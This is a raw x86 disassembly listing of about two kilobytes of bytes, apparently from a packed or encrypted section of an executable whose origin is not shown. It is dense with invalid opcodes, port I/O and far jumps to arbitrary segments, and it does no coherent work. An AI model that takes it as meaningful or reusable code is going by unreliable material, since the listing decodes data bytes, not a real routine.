  41c7d6:	xor    al,0xe6
  41c7d8:	pop    ss
  41c7d9:	mov    edi,0x993d638e
  41c7de:	inc    esi
  41c7df:	push   edi
  41c7e0:	dec    eax
  41c7e1:	ror    BYTE PTR [ebx+0x3c98c839],1
  41c7e7:	out    0x63,eax
  41c7e9:	pusha  
  41c7ea:	xor    eax,0x5fe28077
  41c7ef:	(bad)  
  41c7f0:	mov    ds:0x1467f0b,al
  41c7f5:	stos   BYTE PTR es:[edi],al
  41c7f6:	jl     0x41c7ac
  41c7f8:	gs or  edi,ebx
  41c7fb:	in     al,dx
  41c7fc:	sub    eax,0x30201004
  41c801:	enter  0xb9a8,0xb
  41c805:	and    al,0x7c
  41c807:	mov    esi,0x3b351e5e
  41c80c:	sbb    ch,BYTE PTR [ecx]
  41c80e:	inc    ebp
  41c80f:	ins    DWORD PTR es:[edi],dx
  41c810:	aas    
  41c811:	imul   ebx,DWORD PTR [esi+0x20],0x9bb5cf84
  41c818:	sub    eax,0x3d32946d
  41c81d:	sbb    al,0x1b
  41c81f:	adc    DWORD PTR [ebx+0x67],esi
  41c822:	push   ds
  41c823:	pusha  
  41c824:	mov    al,BYTE PTR [ecx+0x3c19f970]
  41c82a:	or     DWORD PTR [ebp+0x6d],esp
  41c82d:	popa   
  41c82e:	cmp    eax,0x52201028
  41c833:	adc    eax,0x2b4b408d
  41c838:	and    DWORD PTR [edx],ebp
  41c83a:	fistp  WORD PTR [eax+0x1e]
  41c83d:	sub    eax,0x8c2d8324
  41c842:	data16 jno 0x41c8a7
  41c845:	xor    edi,DWORD PTR [eax-0x38]
  41c848:	imul   BYTE PTR [ebp-0x428e511e]
  41c84e:	fild   WORD PTR [edi+eiz*2]
  41c851:	lock jno 0x41c8bb
  41c854:	inc    eax
  41c855:	addr16 mov dl,0xdc
  41c858:	ins    DWORD PTR es:[edi],dx
  41c859:	lock add eax,DWORD PTR ds:0x2adc2b39
  41c860:	cmp    esi,DWORD PTR [esi-0x65]
  41c863:	cmp    BYTE PTR [edx],dl
  41c865:	or     DWORD PTR [ebx],eax
  41c867:	push   edx
  41c868:	rcl    BYTE PTR [ecx],cl
  41c86a:	adc    al,0x65
  41c86c:	push   esp
  41c86d:	inc    ebp
  41c86e:	or     eax,0x8ca1aaf6
  41c873:	cli    
  41c874:	ss pushf 
  41c876:	mov    eax,0xd141d10c
  41c87b:	mov    ah,0xfc
  41c87d:	push   ebp
  41c87e:	ss daa 
  41c880:	sub    BYTE PTR [edx+0x1666c832],0xc9
  41c887:	pusha  
  41c888:	and    DWORD PTR [eax-0x34a005eb],eax
  41c88e:	mov    dh,0x86
  41c890:	int    0x3
  41c892:	push   0x6529fba
  41c897:	add    bl,dl
  41c899:	je     0x41c89a
  41c89b:	(bad)  
  41c89c:	js     0x41c838
  41c89e:	pop    ecx
  41c89f:	sub    ch,BYTE PTR [edx-0x30]
  41c8a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c8a3:	(bad)  
  41c8a4:	cmp    dh,BYTE PTR [edx+0x2d75ec1c]
  41c8aa:	inc    esi
  41c8ab:	pop    esp
  41c8ac:	push   esp
  41c8ad:	pop    ebx
  41c8ae:	(bad)  
  41c8af:	pop    esp
  41c8b0:	and    al,0xdc
  41c8b2:	mov    dh,0xc4
  41c8b4:	add    DWORD PTR [ebp-0x6ec62cb3],0xffffffe7
  41c8bb:	aad    0x36
  41c8bd:	(bad)  
  41c8be:	outs   dx,BYTE PTR ds:[esi]
  41c8bf:	inc    edi
  41c8c0:	outs   dx,DWORD PTR ds:[esi]
  41c8c1:	mov    eax,DWORD PTR [ebx+0x34c2ef1b]
  41c8c7:	in     al,dx
  41c8c8:	sub    al,0x9a
  41c8ca:	dec    edx
  41c8cb:	and    eax,0xf5d9acd5
  41c8d0:	shl    BYTE PTR [ecx],0xd5
  41c8d3:	sub    BYTE PTR [edi-0x75781368],dl
  41c8d9:	loop   0x41c90e
  41c8db:	mov    bh,0x10
  41c8dd:	gs adc al,0x31
  41c8e0:	pop    ecx
  41c8e1:	mov    ch,0xea
  41c8e3:	or     DWORD PTR [ebx],ecx
  41c8e5:	dec    ebp
  41c8e6:	pusha  
  41c8e7:	pop    ss
  41c8e8:	mov    bh,0x25
  41c8ea:	push   ecx
  41c8eb:	push   ebx
  41c8ec:	push   ebx
  41c8ed:	inc    esp
  41c8ee:	pop    ecx
  41c8ef:	icebp  
  41c8f0:	jo     0x41c8a9
  41c8f2:	stos   BYTE PTR es:[edi],al
  41c8f3:	sub    al,0x50
  41c8f5:	imul   ebp,DWORD PTR [eax+edi*8+0x53],0x3f072595
  41c8fd:	in     eax,0x94
  41c8ff:	jnp    0x41c8c1
  41c901:	mov    ch,0xe
  41c903:	loopne 0x41c979
  41c905:	nop
  41c906:	fadd   DWORD PTR [eax+eiz*8]
  41c909:	jle    0x41c97e
  41c90b:	stc    
  41c90c:	jb     0x41c94f
  41c90e:	call   0x9773:0xfcb325b2
  41c915:	dec    esp
  41c916:	push   edx
  41c917:	jns    0x41c8f1
  41c919:	mov    ds:0xfad2abf7,al
  41c91e:	pop    es
  41c91f:	sub    al,0x41
  41c921:	mov    ecx,DWORD PTR [edi]
  41c923:	ror    BYTE PTR [edx+0x523bf46e],0xd6
  41c92a:	mov    esi,0xa5d62214
  41c92f:	push   ds
  41c930:	popa   
  41c931:	shr    DWORD PTR [edx-0x24b3805b],1
  41c937:	ss sub al,0x48
  41c93a:	jp     0x41c988
  41c93c:	imul   edx,DWORD PTR [ebx+ebx*4-0x24fec373],0x33aedd90
  41c947:	icebp  
  41c948:	hlt    
  41c949:	and    ch,BYTE PTR [eax+ebx*2]
  41c94c:	jl     0x41c8d4
  41c94e:	in     eax,dx
  41c94f:	and    BYTE PTR [ebx-0x58],ch
  41c952:	add    DWORD PTR [ecx-0x52415b29],esi
  41c958:	and    DWORD PTR [edx+ecx*1],esi
  41c95b:	jns    0x41c98b
  41c95d:	mov    dh,0x40
  41c95f:	les    edi,FWORD PTR [edx+0x12039a89]
  41c965:	push   edi
  41c966:	or     DWORD PTR [ebx+eax*1-0x67],esi
  41c96a:	inc    esi
  41c96b:	pop    ds
  41c96c:	cmc    
  41c96d:	js     0x41c965
  41c96f:	nop
  41c970:	gs cmc 
  41c972:	push   0x4a52167
  41c977:	mov    cl,0x14
  41c979:	imul   edx,eax,0xfffffff0
  41c97c:	or     DWORD PTR [edx+ebx*4+0x2f],ebx
  41c980:	fcmovb st,st(1)
  41c982:	adc    DWORD PTR [esi+eax*8],eax
  41c985:	inc    esi
  41c986:	xor    cl,dh
  41c988:	aas    
  41c989:	xor    DWORD PTR [edx],esi
  41c98b:	mov    al,0x3d
  41c98d:	dec    edx
  41c98e:	out    0x1f,eax
  41c990:	pop    es
  41c991:	dec    esp
  41c992:	add    eax,0xf6ce746b
  41c997:	xchg   DWORD PTR [ecx+0x43],edx
  41c99a:	sahf   
  41c99b:	dec    ecx
  41c99c:	push   0xffffffe2
  41c99e:	push   es
  41c99f:	add    eax,0x4da29153
  41c9a4:	mov    dh,0x96
  41c9a6:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  41c9a8:	xor    esi,DWORD PTR [edi-0x80]
  41c9ab:	cld    
  41c9ac:	in     al,0x4
  41c9ae:	mov    eax,ds:0x9d9e80cb
  41c9b3:	lock sub BYTE PTR [eax-0x10f3dbbf],dh
  41c9ba:	aas    
  41c9bb:	push   esp
  41c9bc:	out    0xb7,eax
  41c9be:	icebp  
  41c9bf:	sbb    ch,BYTE PTR [ebx-0xc]
  41c9c2:	xchg   ecx,eax
  41c9c3:	ins    BYTE PTR es:[edi],dx
  41c9c4:	bound  edi,QWORD PTR [ebx]
  41c9c6:	loop   0x41c97f
  41c9c8:	push   es
  41c9c9:	ins    DWORD PTR es:[edi],dx
  41c9ca:	inc    edi
  41c9cb:	and    al,0x4d
  41c9cd:	pop    ebx
  41c9ce:	sbb    al,0x62
  41c9d0:	mov    eax,0xdb282d09
  41c9d5:	std    
  41c9d6:	iret   
  41c9d7:	ins    DWORD PTR es:[edi],dx
  41c9d8:	dec    edi
  41c9d9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c9da:	loop   0x41ca07
  41c9dc:	jg     0x41ca1d
  41c9de:	in     al,dx
  41c9df:	cmp    BYTE PTR [edx+0x4449b297],bl
  41c9e5:	and    DWORD PTR ds:0x46604c08,edi
  41c9eb:	outs   dx,DWORD PTR ds:[esi]
  41c9ec:	mov    ah,0x1f
  41c9ee:	and    eax,0x93c95447
  41c9f3:	inc    esp
  41c9f4:	adc    dl,BYTE PTR gs:[ecx-0x23509df4]
  41c9fb:	std    
  41c9fc:	jmp    0x8faf:0x8d64a0be
  41ca03:	stos   BYTE PTR es:[edi],al
  41ca04:	(bad)
  41ca07:	lods   al,BYTE PTR cs:[esi]
  41ca09:	jo     0x41ca73
  41ca0b:	(bad)  
  41ca0c:	xchg   edi,eax
  41ca0d:	push   sp
  41ca0f:	xor    DWORD PTR [edi-0x2d05cb8c],ebx
  41ca15:	pop    ebp
  41ca16:	sbb    dl,bh
  41ca18:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ca19:	and    eax,edx
  41ca1b:	jmp    0xbda55dbf
  41ca20:	push   es
  41ca21:	js     0x41ca8b
  41ca23:	imul   edx,DWORD PTR [ebp-0x15],0x987add1a
  41ca2a:	sahf   
  41ca2b:	mov    bl,0xa7
  41ca2d:	stos   BYTE PTR es:[edi],al
  41ca2e:	jp     0x41c9e7
  41ca30:	cmp    DWORD PTR [eax],esi
  41ca32:	test   ch,dl
  41ca34:	push   edi
  41ca35:	push   0xffffffd5
  41ca37:	pushf  
  41ca38:	add    eax,0x774f9a37
  41ca3d:	imul   ebx,DWORD PTR [eax],0x78
  41ca40:	jno    0x41ca83
  41ca42:	jecxz  0x41ca35
  41ca44:	sbb    ebp,ecx
  41ca46:	sub    BYTE PTR [esi],0x55
  41ca49:	js     0x41ca47
  41ca4b:	xlat   BYTE PTR ds:[ebx]
  41ca4c:	xchg   ebp,eax
  41ca4d:	xchg   ecx,eax
  41ca4e:	dec    ebp
  41ca4f:	add    DWORD PTR [ecx+edx*4],esi
  41ca52:	dec    ebp
  41ca53:	and    BYTE PTR [ebp+0xe],0xdd
  41ca57:	or     DWORD PTR [edx-0x7d],eax
  41ca5a:	pushf  
  41ca5b:	pushf  
  41ca5c:	xlat   BYTE PTR ds:[ebx]
  41ca5d:	xchg   ebp,eax
  41ca5e:	in     eax,dx
  41ca5f:	div    DWORD PTR [edi+0x4faf49ba]
  41ca65:	fwait
  41ca66:	inc    edx
  41ca67:	jbe    0x41ca84
  41ca69:	idiv   BYTE PTR [edx-0x31]
  41ca6c:	sahf   
  41ca6d:	loope  0x41ca88
  41ca6f:	fdiv   DWORD PTR [esi]
  41ca71:	scas   al,BYTE PTR es:[edi]
  41ca72:	mov    dh,0x2b
  41ca74:	call   0x22d4d6b1
  41ca79:	rcl    BYTE PTR [edi],0x2f
  41ca7c:	jne    0x41ca53
  41ca7e:	js     0x41ca29
  41ca80:	jl     0x41ca9c
  41ca82:	shl    DWORD PTR [ebp-0x7],0x50
  41ca86:	pop    ebx
  41ca87:	and    bl,cl
  41ca89:	mov    ebx,0xa5a16435
  41ca8e:	jae    0x41cae8
  41ca90:	sub    ebp,DWORD PTR [edx-0x1dbfb803]
  41ca96:	icebp  
  41ca97:	adc    eax,0xdb196e1d
  41ca9c:	cs xchg edi,eax
  41ca9e:	lods   eax,DWORD PTR ds:[esi]
  41ca9f:	aad    0x3
  41caa1:	fcmovnbe st,st(1)
  41caa3:	mov    ch,0xcb
  41caa5:	pop    ss
  41caa6:	(bad)  
  41caa7:	xlat   BYTE PTR ds:[ebx]
  41caa8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41caa9:	xchg   ebp,eax
  41caaa:	adc    eax,0x233b967
  41caaf:	mov    ecx,0x6be26362
  41cab4:	inc    edi
  41cab5:	dec    esi
  41cab6:	test   DWORD PTR [esi+eax*1],ebx
  41cab9:	daa    
  41caba:	jo     0x41cacd
  41cabc:	dec    eax
  41cabd:	mov    esp,0x333baca8
  41cac2:	pop    es
  41cac3:	shr    BYTE PTR ds:0xa799349,1
  41cac9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41caca:	loopne 0x41cad5
  41cacc:	or     dh,BYTE PTR [ecx-0x79]
  41cacf:	mov    edi,0x44569d03
  41cad4:	pop    ds
  41cad5:	jge    0x41cacf
  41cad7:	mul    DWORD PTR [esi-0x6d90635e]
  41cadd:	jg     0x41cb57
  41cadf:	xor    BYTE PTR [eax],bh
  41cae1:	scas   eax,DWORD PTR es:[edi]
  41cae2:	test   DWORD PTR [edx+0x6],0x1d069c56
  41cae9:	pop    DWORD PTR [ebx-0x67]
  41caec:	jle    0x41cb6d
  41caee:	shl    DWORD PTR ds:0x779e3a82,0x76
  41caf5:	shl    ebx,cl
  41caf7:	arpl   bp,cx
  41caf9:	iret   
  41cafa:	adc    al,0x4
  41cafc:	fadd   st(4),st
  41cafe:	pushf  
  41caff:	jge    0x41ca8d
  41cb01:	or     DWORD PTR [esi-0x1a],ebx
  41cb04:	int    0x35
  41cb06:	ret    0x2230
  41cb09:	pop    ebx
  41cb0a:	out    dx,al
  41cb0b:	scas   eax,DWORD PTR es:[edi]
  41cb0c:	popa   
  41cb0d:	js     0x41cb23
  41cb0f:	popf   
  41cb10:	std    
  41cb11:	jb     0x41caf8
  41cb13:	mov    eax,0xc3555b7f
  41cb18:	jns    0x41cab1
  41cb1a:	jmp    0x312911cd
  41cb1f:	outs   dx,BYTE PTR ds:[esi]
  41cb20:	in     al,dx
  41cb21:	ret    
  41cb22:	ja     0x41cae2
  41cb24:	stos   BYTE PTR es:[edi],al
  41cb25:	xchg   DWORD PTR [ebp-0x51],esi
  41cb28:	adc    al,0x47
  41cb2a:	jmp    0x41cac1
  41cb2c:	fwait
  41cb2d:	(bad)  
  41cb2e:	xchg   ebx,eax
  41cb2f:	dec    esp
  41cb30:	or     BYTE PTR [ebp+0x73],cl
  41cb33:	add    BYTE PTR [ebx],dh
  41cb35:	pop    esp
  41cb36:	inc    BYTE PTR [edi+0x511adc84]
  41cb3c:	cli    
  41cb3d:	call   0xdf81:0x549b4227
  41cb44:	loop   0x41cbb5
  41cb46:	cmp    eax,0x2708c113
  41cb4b:	idiv   BYTE PTR [ebp+0x2a2423ba]
  41cb51:	cs pusha 
  41cb53:	call   0x62eef73d
  41cb58:	les    eax,FWORD PTR [edx]
  41cb5a:	jns    0x41cb59
  41cb5c:	cld    
  41cb5d:	sub    cl,BYTE PTR [esi]
  41cb5f:	ss push ds
  41cb61:	xchg   ebp,eax
  41cb62:	fdivrp st(3),st
  41cb64:	ds mov dl,0x15
  41cb67:	stos   DWORD PTR es:[edi],eax
  41cb68:	pop    esp
  41cb69:	or     al,0x7e
  41cb6b:	add    cl,0x4e
  41cb6e:	pop    esp
  41cb6f:	sub    ebp,edi
  41cb71:	cwde   
  41cb72:	inc    eax
  41cb73:	dec    ebx
  41cb74:	inc    esi
  41cb75:	shl    dl,0xd7
  41cb78:	dec    eax
  41cb79:	xor    eax,edi
  41cb7b:	cld    
  41cb7c:	jbe    0x41cb2c
  41cb7e:	add    bh,BYTE PTR [edx+0x23]
  41cb81:	fistp  DWORD PTR [eax-0xcfc163b]
  41cb87:	mov    dh,0x1f
  41cb89:	lea    ecx,[ebp+0x182dd376]
  41cb8f:	add    al,0x7b
  41cb91:	cld    
  41cb92:	mov    bl,0xaa
  41cb94:	sub    eax,0xac9fd0f
  41cb99:	(bad)  
  41cb9a:	fistp  QWORD PTR [edi-0x1c698619]
  41cba0:	push   esi
  41cba1:	dec    ebp
  41cba2:	xchg   BYTE PTR [ecx+0x6aac3219],bl
  41cba8:	je     0x41cc0f
  41cbaa:	int    0xcb
  41cbac:	mov    edx,DWORD PTR [ebx]
  41cbae:	iret   
  41cbaf:	inc    eax
  41cbb0:	add    DWORD PTR [ebp-0x50],edx
  41cbb3:	add    al,0x9a
  41cbb5:	sti    
  41cbb6:	pop    ebx
  41cbb7:	mov    ebp,0x184f546f
  41cbbc:	retf   
  41cbbd:	sbb    eax,0x448c8464
  41cbc2:	push   ds
  41cbc3:	into   
  41cbc4:	sbb    esi,edi
  41cbc6:	cmp    DWORD PTR [esi-0x560fb928],0xffffff97
  41cbcd:	inc    edi
  41cbce:	ds pop ecx
  41cbd0:	aas    
  41cbd1:	scas   al,BYTE PTR es:[edi]
  41cbd2:	xchg   ecx,eax
  41cbd3:	push   0xf7475bac
  41cbd8:	mov    bh,0x1f
  41cbda:	fisttp QWORD PTR [ebp-0x40]
  41cbdd:	hlt    
  41cbde:	mov    ebx,0x2bef9e48
  41cbe3:	retf   
  41cbe4:	or     BYTE PTR [ebp-0x4a],0x4f
  41cbe8:	xchg   edi,eax
  41cbe9:	mov    al,0xb9
  41cbeb:	jae    0x41cbde
  41cbed:	(bad)  
  41cbee:	mov    WORD PTR fs:[esi+0x141f83d5],?
  41cbf5:	lods   eax,DWORD PTR ds:[esi]
  41cbf6:	mov    esp,0xf81f7a84
  41cbfb:	dec    ebx
  41cbfc:	sbb    al,0x7
  41cbfe:	lods   al,BYTE PTR ds:[esi]
  41cbff:	push   edi
  41cc00:	pop    esi
  41cc01:	cmp    eax,0x3372ac6d
  41cc06:	(bad)  
  41cc07:	push   0x17098b8b
  41cc0c:	loope  0x41cc5f
  41cc0e:	test   al,0x63
  41cc10:	dec    edi
  41cc11:	sahf   
  41cc12:	retf   
  41cc13:	lods   eax,DWORD PTR ds:[esi]
  41cc14:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cc15:	psrlw  mm1,QWORD PTR [eax+0x16c31a3e]
  41cc1c:	xchg   ebp,eax
  41cc1d:	repz xchg esp,eax
  41cc1f:	icebp  
  41cc20:	lds    edi,FWORD PTR [ebx]
  41cc22:	(bad)  
  41cc23:	adc    cl,BYTE PTR [ebp-0x737c5e8e]
  41cc29:	test   DWORD PTR [edx-0x3530af9e],edx
  41cc2f:	sahf   
  41cc30:	clc    
  41cc31:	pushf  
  41cc32:	popf   
  41cc33:	pop    edi
  41cc34:	sub    al,BYTE PTR [edx]
  41cc36:	mov    cl,BYTE PTR [edx-0x78]
  41cc39:	mov    ebx,0xa1910dd2
  41cc3e:	xchg   ebp,eax
  41cc3f:	push   ebp
  41cc40:	ja     0x41cbd7
  41cc42:	jb     0x41ccbc
  41cc44:	inc    ebx
  41cc45:	xchg   esi,eax
  41cc46:	or     bl,BYTE PTR [esi+0x27810cfe]
  41cc4c:	ins    BYTE PTR es:[edi],dx
  41cc4d:	stos   BYTE PTR es:[edi],al
  41cc4e:	(bad)  
  41cc4f:	les    ebx,FWORD PTR [ebx-0x1e]
  41cc52:	push   cs
  41cc53:	ins    BYTE PTR es:[edi],dx
  41cc54:	xchg   ebx,eax
  41cc55:	jnp    0x41cc00
  41cc57:	mov    dh,0xcf
  41cc59:	mov    edx,0x838b1119
  41cc5e:	inc    ebx
  41cc5f:	jae    0x41cbff
  41cc61:	fwait
  41cc62:	icebp  
  41cc63:	mov    al,0x8f
  41cc65:	aaa    
  41cc66:	daa    
  41cc67:	imul   DWORD PTR [ebx-0x29]
  41cc6a:	leave  
  41cc6b:	jecxz  0x41cc2b
  41cc6d:	mov    edi,0xdcd81743
  41cc72:	gs push 0x81c0e24d
  41cc78:	test   eax,0x10c27732
  41cc7d:	jo     0x41cc57
  41cc7f:	lahf   
  41cc80:	xor    eax,0xbeda077a
  41cc85:	ret    0xf7a9
  41cc88:	enter  0xa223,0xeb
  41cc8c:	inc    esp
  41cc8d:	or     esp,DWORD PTR [esi+0x7229cf04]
  41cc93:	sti    
  41cc94:	inc    ebp
  41cc95:	push   ebp
  41cc96:	icebp  
  41cc97:	hlt    
  41cc98:	neg    BYTE PTR [edi-0x3b6c3e5e]
  41cc9e:	mov    ds:0x49547959,eax
  41cca3:	or     DWORD PTR [ecx+edx*8],ebp
  41cca6:	sub    eax,0x532956ed
  41ccab:	leave  
  41ccac:	pop    ds
  41ccad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ccae:	inc    ebx
  41ccaf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ccb0:	push   esi
  41ccb1:	(bad)  
  41ccb3:	sbb    ah,BYTE PTR [eax]
  41ccb5:	enter  0xb95a,0x9b
  41ccb9:	(bad)  
  41ccba:	icebp  
  41ccbb:	sti    
  41ccbc:	jg     0x41cd1c
  41ccbe:	mov    eax,0xca231a6c
  41ccc3:	inc    esi
  41ccc4:	lock nop
  41ccc6:	loopne 0x41cd1b
  41ccc8:	mov    esi,0xb012f870
  41cccd:	es sbb edi,ebx
  41ccd0:	not    BYTE PTR [esi+0x3f]
  41ccd3:	xor    ebx,DWORD PTR [edx]
  41ccd5:	sbb    dl,ch
  41ccd7:	adc    DWORD PTR ds:0xcb03b4de,0x1
  41ccde:	arpl   WORD PTR [ebp-0x69],sp
  41cce1:	add    BYTE PTR [ebx+0x1d],dl
  41cce4:	stc    
  41cce5:	idiv   DWORD PTR [edx+eiz*4+0x1cc5d1ea]
  41ccec:	das    
  41cced:	adc    BYTE PTR [edi-0x264eaf15],dl
  41ccf3:	lds    esp,FWORD PTR [eax+0x53]
  41ccf6:	and    bh,bl
  41ccf8:	mov    edx,0x26019f34
  41ccfd:	stos   DWORD PTR es:[edi],eax
  41ccfe:	jnp    0x41ccff
  41cd00:	jg     0x41ccc0
  41cd02:	test   BYTE PTR [ebx+0x6cd94d1b],dh
  41cd08:	test   BYTE PTR [ebp-0x3693004b],bl
  41cd0e:	mov    ds:0x9c849926,eax
  41cd13:	xchg   ebx,eax
  41cd14:	and    DWORD PTR [esi-0x43bf525e],ecx
  41cd1a:	pop    esi
  41cd1b:	pop    esp
  41cd1c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cd1d:	test   BYTE PTR [ebx-0x6b69f303],bl
  41cd23:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cd24:	adc    eax,0xe625fbce
  41cd29:	add    al,0xec
  41cd2b:	jg     0x41ccb1
  41cd2d:	out    0x9e,al
  41cd2f:	and    esi,0x1b1b94c
  41cd35:	cmp    DWORD PTR [eax+0x2471fbd9],edi
  41cd3b:	adc    DWORD PTR [ebp+0x29],0xf45952ae
  41cd42:	cmp    al,0x86
  41cd44:	pop    edx
  41cd45:	push   ebx
  41cd46:	out    dx,eax
  41cd47:	jmp    0x41cd87
  41cd49:	pop    es
  41cd4a:	push   edx
  41cd4b:	lds    edx,FWORD PTR [eax]
  41cd4d:	repnz inc esi
  41cd4f:	cmp    DWORD PTR [esi+0x210789ec],0x7b
  41cd56:	jnp    0x41cd9c
  41cd58:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cd59:	and    DWORD PTR [edx+0x6a61fc71],esp
  41cd5f:	loopne 0x41cd82
  41cd61:	call   0xe642:0x690c2af2
  41cd68:	dec    ebx
  41cd69:	retf   0x4eec
  41cd6c:	xor    al,0x8f
  41cd6e:	int    0xfb
  41cd70:	std    
  41cd71:	jle    0x41cd2c
  41cd73:	nop
  41cd74:	add    bh,0xe1
  41cd77:	xchg   ebx,eax
  41cd78:	mov    ecx,0x9e8d6827
  41cd7d:	out    0xae,eax
  41cd7f:	aam    0xd7
  41cd81:	or     DWORD PTR [ebx-0xa],eax
  41cd84:	add    BYTE PTR [edx-0x6f],0xfc
  41cd88:	lods   al,BYTE PTR ds:[esi]
  41cd89:	adc    DWORD PTR [edi+0x31],edi
  41cd8c:	jecxz  0x41cd99
  41cd8e:	das    
  41cd8f:	or     esi,DWORD PTR [edi+ecx*8]
  41cd92:	daa    
  41cd93:	add    ebp,DWORD PTR [ebx+0x53]
  41cd96:	popf   
  41cd97:	inc    edi
  41cd98:	int3   
  41cd99:	dec    ebx
  41cd9a:	lea    edi,[esi+0x1009fff]
  41cda0:	outs   dx,BYTE PTR ds:[esi]
  41cda1:	repnz mov dh,0x1f
  41cda4:	push   0x18
  41cda6:	mov    al,ds:0xb0b33cc8
  41cdab:	pop    edi
  41cdac:	lods   al,BYTE PTR ds:[esi]
  41cdad:	jmp    ebp
  41cdaf:	inc    edx
  41cdb0:	fld    DWORD PTR [ebx]
  41cdb2:	jne    0x41cd86
  41cdb4:	es add al,0xb3
  41cdb7:	stc    
  41cdb8:	and    dh,BYTE PTR [esi+0x69]
  41cdbb:	aad    0x56
  41cdbd:	push   0xffffffdc
  41cdbf:	int3   
  41cdc0:	dec    esi
  41cdc1:	inc    eax
  41cdc2:	or     eax,DWORD PTR [edx]
  41cdc4:	push   ecx
  41cdc5:	cld    
  41cdc6:	loope  0x41cdbb
  41cdc8:	mov    esp,DWORD PTR [ebx]
  41cdca:	push   es
  41cdcb:	mov    ds:0xfdfd64d7,al
  41cdd0:	loope  0x41ce1b
  41cdd2:	inc    ecx
  41cdd3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cdd4:	sti    
  41cdd5:	mov    ch,0x59
  41cdd7:	mov    BYTE PTR [ebx+0xc],bl
  41cdda:	push   ecx
  41cddb:	cmp    al,dl
  41cddd:	add    eax,0x3915f447
  41cde2:	inc    esi
  41cde3:	pop    eax
  41cde4:	or     eax,0x1439cc06
  41cde9:	popa   
  41cdea:	xor    DWORD PTR [edx],esi
  41cdec:	adc    eax,0x3fa970fe
  41cdf1:	(bad)  
  41cdf2:	cld    
  41cdf3:	aam    0x5a
  41cdf5:	gs sbb al,0xa
  41cdf8:	add    al,0x9b
  41cdfa:	test   BYTE PTR [esi-0x7da23a74],al
  41ce00:	bound  eax,QWORD PTR [ebp+eax*1-0x2b7c8dd7]
  41ce07:	lds    ebx,FWORD PTR ds:[ecx]
  41ce0a:	enter  0x52a5,0xad
  41ce0e:	or     BYTE PTR [ecx],al
  41ce10:	jmp    0x32acc1cb
  41ce15:	pop    esi
  41ce16:	sbb    ecx,DWORD PTR [esi+eax*4]
  41ce19:	enter  0xe357,0x33
  41ce1d:	fwait
  41ce1e:	nop
  41ce1f:	(bad)  
  41ce20:	cli    
  41ce21:	dec    edx
  41ce22:	test   DWORD PTR [edx+0x18],eax
  41ce25:	enter  0xb9f8,0x1a
  41ce29:	xchg   esp,eax
  41ce2a:	iret   
  41ce2b:	inc    edi
  41ce2c:	test   al,0xb7
  41ce2e:	inc    esi
  41ce2f:	lea    esi,[esp+ebp*8+0x21]
  41ce33:	mov    ebp,0x36ed0046
  41ce38:	xor    DWORD PTR [ebx-0x5c],edx
  41ce3b:	cmp    BYTE PTR [ebp+0x4c66d72c],bl
  41ce41:	mov    ebx,DWORD PTR [esp+ebp*2-0x33ba5201]
  41ce48:	and    bl,al
  41ce4a:	imul   edx,esp,0x864983f6
  41ce50:	sahf   
  41ce51:	inc    ebp
  41ce52:	fmulp  st(5),st
  41ce54:	int3   
  41ce55:	nop
  41ce56:	push   0x45d795b0
  41ce5b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ce5c:	ja     0x41ce38
  41ce5e:	js     0x41cdf3
  41ce60:	loope  0x41ce0b
  41ce62:	mov    WORD PTR [esi],gs
  41ce64:	mov    dh,0x17
  41ce66:	mov    ecx,0x9384716
  41ce6b:	dec    ecx
  41ce6c:	sub    DWORD PTR [ebp-0x14136461],esi
  41ce72:	jmp    0x4d4f:0xa91e9dda
  41ce79:	dec    esp
  41ce7a:	sub    DWORD PTR [ebx-0x493556fd],ebp
  41ce80:	es retf 0xbaf8
  41ce84:	pusha  
  41ce85:	dec    ebp
  41ce86:	mov    ebp,0x18fa4610
  41ce8b:	dec    ebx
  41ce8c:	test   BYTE PTR [bx-0x1e],ah
  41ce90:	jmp    0x41ce47
  41ce92:	retf   
  41ce93:	or     bh,BYTE PTR [ecx-0x2e98fbfc]
  41ce99:	shl    DWORD PTR [ebp-0x32],0x27
  41ce9d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ce9e:	popa   
  41ce9f:	push   ebp
  41cea0:	(bad)  
  41cea1:	in     al,dx
  41cea2:	mov    eax,ds:0xaa9e4d09
  41cea7:	xchg   ebx,eax
  41cea8:	mov    dh,0x32
  41ceaa:	sar    DWORD PTR [esi],cl
  41ceac:	sti    
  41cead:	mov    ah,ah
  41ceaf:	mov    ecx,0xed8d1cb0
  41ceb4:	into   
  41ceb5:	shl    BYTE PTR [eax+eax*1-0x43],0xb9
  41ceba:	std    
  41cebb:	jmp    0xa10:0xe9845f11
  41cec2:	gs mov bh,0xad
  41cec5:	data16 mov dh,0x99
  41cec8:	cmp    esi,0x11be6c50
  41cece:	adc    eax,0x8e034d07
  41ced3:	lea    ebx,[esi]
  41ced5:	jg     0x41cee5
  41ced7:	or     eax,0xa8f3ac6e
  41cedc:	sbb    al,BYTE PTR [edi]
  41cede:	and    BYTE PTR [ebx+0x23],0x35
  41cee2:	mov    eax,ds:0xc36fa34b
  41cee7:	xchg   BYTE PTR [eax],dh
  41cee9:	(bad)
  41ceee:	stc    
  41ceef:	xchg   DWORD PTR [edi+0x19],edi
  41cef2:	pushf  
  41cef3:	mov    cl,bh
  41cef5:	pop    edi
  41cef6:	inc    ebp
  41cef7:	xchg   edi,eax
  41cef8:	mov    ebp,0x271b29db
  41cefd:	pop    ebp
  41cefe:	outs   dx,BYTE PTR ds:[esi]
  41ceff:	daa    
  41cf00:	scas   al,BYTE PTR es:[edi]
  41cf01:	ja     0x41cf0c
  41cf03:	test   ebp,0xe07fea2d
  41cf09:	and    al,0xe8
  41cf0b:	xchg   edi,eax
  41cf0c:	loopne 0x41cf3a
  41cf0e:	push   es
  41cf0f:	loop   0x41cf53
